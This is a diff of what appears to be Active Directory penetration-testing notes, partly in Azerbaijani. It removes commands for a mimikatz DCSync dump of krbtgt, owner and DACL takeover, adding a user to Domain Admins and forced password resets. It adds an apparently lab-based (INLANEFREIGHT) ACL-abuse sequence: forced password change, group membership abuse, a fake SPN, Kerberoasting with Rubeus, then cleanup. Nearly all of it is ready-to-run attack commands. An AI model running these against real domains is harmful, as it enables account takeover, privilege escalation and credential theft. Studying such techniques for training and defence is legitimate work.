@@ -101,29 +101,44 @@ grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
 0x40000000  | GenericWrite       | Bir çox atributa write (SPN add → Kerberoasting, group takeover, RBCD)
 0x80000000  | GenericRead        | Geniş oxuma hüququ (Kerberoast recon, LAPS read əgər qorunmayıbsa)
 
-# DCSync icazəsi ilə NTDS dump
-Get-DomainUser -Identity targetuser | Get-DomainSPNTicket  # Önce test
-mimikatz.exe "lsadump::dcsync /domain:domain.com /user:krbtgt" exit
-
-WriteOwner (0x20000) Abuse - Owner Takeover
-# Owner-ı özünə dəyiş
-Set-DomainObjectOwner -Identity "CN=targetuser,CN=Users,DC=domain,DC=com" -OwnerIdentity currentuser
-# Sonra GenericAll əlavə et
-Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity currentuser -Rights All
-
-WriteDacl (0x20000) Abuse - Backdoor ACL
-$ACL = New-Object Security.AccessControl.ActiveDirectorySecurity
-$ACE = New-Object Security.AccessControl.ActiveDirectoryAccessRule($UserSID,"GenericAll","Allow")
-$ACL.AddAccessRule($ACE)
-Set-DomainObject -Identity targetgroup -Replace @{'nTSecurityDescriptor'=$ACL}
-
-GenericWrite (0x2) Abuse - Group Add/Password Reset
-# Group-a add et (Domain Admins)
-Add-DomainGroupMember -Identity "Domain Admins" -Members currentuser
-# Password reset
-Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
-
-ForceChangePassword Abuse
-# SPN user üçün pass reset (Kerberoast sonrası)
-Set-DomainUser -Identity svc-sql -AccountPassword (ConvertTo-SecureString "Summer20!$" -AsPlainText -Force) -SamAccountName svc-sql
 ```
+
+# ACL Abuse Tactics
+```
+# Creating a PSCredential Object
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+# Creating a SecureString Object
+$<USER>Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+# Changing the User's Password
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+# Creating a SecureString Object using damundsen
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+
+# Adding damundsen to the Help Desk Level 1 Group
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# Confirming damundsen was Added to the Group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+# Creating a Fake SPN
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# Kerberoasting with Rubeus
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# Removing the Fake SPN from adunn's Account
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# Removing damundsen from the Help Desk Level 1 Group
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+
+
